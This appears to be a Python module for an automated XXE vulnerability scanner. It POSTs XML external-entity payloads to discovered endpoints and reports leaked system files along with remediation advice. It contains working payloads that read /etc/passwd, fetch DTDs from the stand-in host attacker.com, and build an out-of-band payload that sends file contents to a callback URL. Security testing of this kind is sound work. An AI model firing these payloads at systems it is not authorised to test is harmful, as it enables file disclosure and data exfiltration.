import os
import json
import asyncio
import aiohttp
from urllib.parse import urlparse
from logger import get_logger

logger = get_logger(__name__)

class XXEScanner:
    def __init__(self):
        self.results_dir = "xxe_results"
        os.makedirs(self.results_dir, exist_ok=True)
        self.payloads = [
            # Basic XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
            <root>&xxe;</root>''',
            
            # Blind XXE with external DTD
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test SYSTEM "http://attacker.com/evil.dtd">
            <root>Test</root>''',
            
            # XXE with parameter entities
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
            <root>Test</root>''',
            
            # XXE with OOB data retrieval
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [ 
                <!ENTITY % file SYSTEM "file:///etc/passwd">
                <!ENTITY % dtd SYSTEM "http://attacker.com/oob.dtd">
                %dtd;
            ]>
            <root>Test</root>''',
            
            # XXE with CDATA
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
            <root><![CDATA[&xxe;]]></root>''',
            
            # XXE with UTF-16 encoding
            '''<?xml version="1.0" encoding="UTF-16"?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
            <root>&xxe;</root>'''
        ]
        
        self.content_types = [
            'application/xml',
            'text/xml',
            'application/soap+xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data'
        ]

    async def scan(self, url, session):
        """
        Main entry point for XXE scanning. This method is called from app.py.
        
        Args:
            url (str): The main URL/domain to scan
            session (aiohttp.ClientSession): The session to use for HTTP requests
            
        Returns:
            dict: Results of the XXE scan
        """
        try:
            logger.info(f"Starting XXE scan for {url}")
            
            # Check if subdomain scan results are available
            from subdomain_scanner import subdomain_scan_results
            
            if subdomain_scan_results and subdomain_scan_results.get("all_urls"):
                # Use URLs from subdomain scan
                urls_to_scan = subdomain_scan_results.get("all_urls", [])
                logger.info(f"Using {len(urls_to_scan)} URLs from subdomain scan for XXE testing")
            else:
                # Fallback to just the provided URL
                logger.warning("No subdomain scan results available, using only the provided URL")
                urls_to_scan = [url]
            
            # XXE attacks typically work on endpoints that accept XML input
            # We'll focus on URLs that might be API endpoints or form submission handlers
            potential_xml_endpoints = []
            
            # Look for potential XML endpoints based on URL patterns
            for u in urls_to_scan:
                parsed = urlparse(u)
                path = parsed.path.lower()
                
                # Check for common API or XML processing endpoints
                if any(pattern in path for pattern in [
                    'api', 'xml', 'soap', 'wsdl', 'service', 'rpc', 'rest',
                    'upload', 'import', 'process', 'submit', 'post'
                ]):
                    potential_xml_endpoints.append(u)
            
            # If no potential XML endpoints found, use a subset of all URLs
            if not potential_xml_endpoints:
                logger.warning("No obvious XML endpoints found, testing a subset of URLs")
                potential_xml_endpoints = urls_to_scan[:15] if len(urls_to_scan) > 15 else urls_to_scan
            else:
                # Limit the number of endpoints to test
                potential_xml_endpoints = potential_xml_endpoints[:15] if len(potential_xml_endpoints) > 15 else potential_xml_endpoints
            
            if potential_xml_endpoints:
                logger.info(f"Testing {len(potential_xml_endpoints)} potential XML endpoints for XXE vulnerabilities")
                scan_results = await self.scan_urls(potential_xml_endpoints)
            else:
                logger.warning("No URLs found for XXE testing")
                scan_results = {}
            
            # Format the results
            vulnerabilities = []
            for url, result in scan_results.items():
                if result and result.get('is_vulnerable'):
                    for vuln in result.get('vulnerabilities', []):
                        vulnerabilities.append({
                            'url': url,
                            'type': vuln.get('type', 'XML External Entity Injection'),
                            'content_type': vuln.get('content_type', ''),
                            'evidence': vuln.get('evidence', []),
                            'severity': vuln.get('severity', 'Critical'),
                            'response_code': vuln.get('response_code', 0)
                        })
            
            # Get unique recommendations
            recommendations = set()
            for _, result in scan_results.items():
                if result and result.get('is_vulnerable'):
                    recommendations.update(result.get('recommendations', []))
            
            return {
                "xxe_scan": {
                    "status": "completed",
                    "urls_scanned": len(potential_xml_endpoints),
                    "vulnerabilities_found": len(vulnerabilities),
                    "vulnerabilities": vulnerabilities,
                    "recommendations": list(recommendations) if vulnerabilities else [],
                    "cwe": "CWE-611"
                }
            }
            
        except Exception as e:
            logger.error(f"Error in XXE scan: {e}")
            return {
                "xxe_scan": {
                    "status": "error",
                    "error": str(e)
                }
            }

    async def scan_urls(self, urls):
        """
        Scan multiple URLs for XXE vulnerabilities
        """
        try:
            logger.info(f"Starting XXE scan for {len(urls)} URLs")
            results = {}
            
            async with aiohttp.ClientSession() as session:
                for url in urls:
                    result = await self._scan_url(session, url)
                    if result:
                        results[url] = result
            
            return results
        except Exception as e:
            logger.error(f"Error in XXE scan: {e}")
            return {}

    async def _scan_url(self, session, url):
        """
        Test a single URL for XXE vulnerabilities
        """
        try:
            vulnerabilities = []
            
            # Test each payload with different content types
            for content_type in self.content_types:
                for payload in self.payloads:
                    result = await self._test_payload(session, url, payload, content_type)
                    if result:
                        vulnerabilities.append(result)

            if vulnerabilities:
                return {
                    'is_vulnerable': True,
                    'vulnerabilities': vulnerabilities,
                    'recommendations': [
                        "Disable XML external entity processing",
                        "Use secure XML parsers with XXE prevention",
                        "Implement proper input validation",
                        "Use OWASP XML Security Cheat Sheet guidelines",
                        "Consider using JSON instead of XML where possible",
                        "Monitor for suspicious outbound connections",
                        "Implement proper error handling to prevent information leakage"
                    ],
                    'risk_level': 'Critical',
                    'cwe': 'CWE-611'
                }

            return None

        except Exception as e:
            logger.error(f"Error scanning URL {url}: {e}")
            return None

    async def _test_payload(self, session, url, payload, content_type):
        """
        Test a specific XXE payload
        """
        try:
            headers = {
                'Content-Type': content_type,
                'Accept': '*/*'
            }
            
            # Send the payload
            async with session.post(
                url,
                data=payload,
                headers=headers,
                timeout=10,
                allow_redirects=True
            ) as response:
                response_text = await response.text()
                
                # Check for successful XXE indicators
                if await self._check_xxe_success(response_text):
                    return {
                        'type': 'XML External Entity Injection',
                        'payload': payload,
                        'content_type': content_type,
                        'evidence': self._extract_evidence(response_text),
                        'response_code': response.status,
                        'severity': 'Critical'
                    }
            
            return None

        except Exception as e:
            logger.error(f"Error testing XXE payload: {e}")
            return None

    async def _check_xxe_success(self, response_text):
        """
        Check if XXE attack was successful
        """
        indicators = [
            'root:x:0:0',  # /etc/passwd content
            'apache:x:',
            'mysql:x:',
            '[boot loader]',  # Windows system files
            'C:\\Windows\\system32',
            'DOCUMENT_ROOT',  # PHP configuration
            'HTTP_USER_AGENT',
            'java.runtime',  # Java system properties
            'javax.servlet'
        ]
        
        return any(indicator in response_text for indicator in indicators)

    def _extract_evidence(self, response_text):
        """
        Extract evidence of successful XXE from response
        """
        # Look for common patterns in the response
        evidence = []
        
        if 'root:x:0:0' in response_text:
            evidence.append('Unix password file content detected')
        if 'C:\\Windows\\system32' in response_text:
            evidence.append('Windows system directory content detected')
        if 'DOCUMENT_ROOT' in response_text:
            evidence.append('PHP configuration information leaked')
        if 'java.runtime' in response_text:
            evidence.append('Java system properties leaked')
        
        return evidence if evidence else ['Suspicious content detected in response']

    def _generate_oob_payload(self, callback_url):
        """
        Generate an out-of-band XXE payload
        """
        return f'''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{callback_url}?data=%file;'>">
            %eval;
            %exfil;
        ]>
        <root>Test</root>'''

    def _validate_response(self, response_text):
        """
        Validate if the response indicates a successful XXE
        """
        # Add custom validation logic based on response patterns
        pass
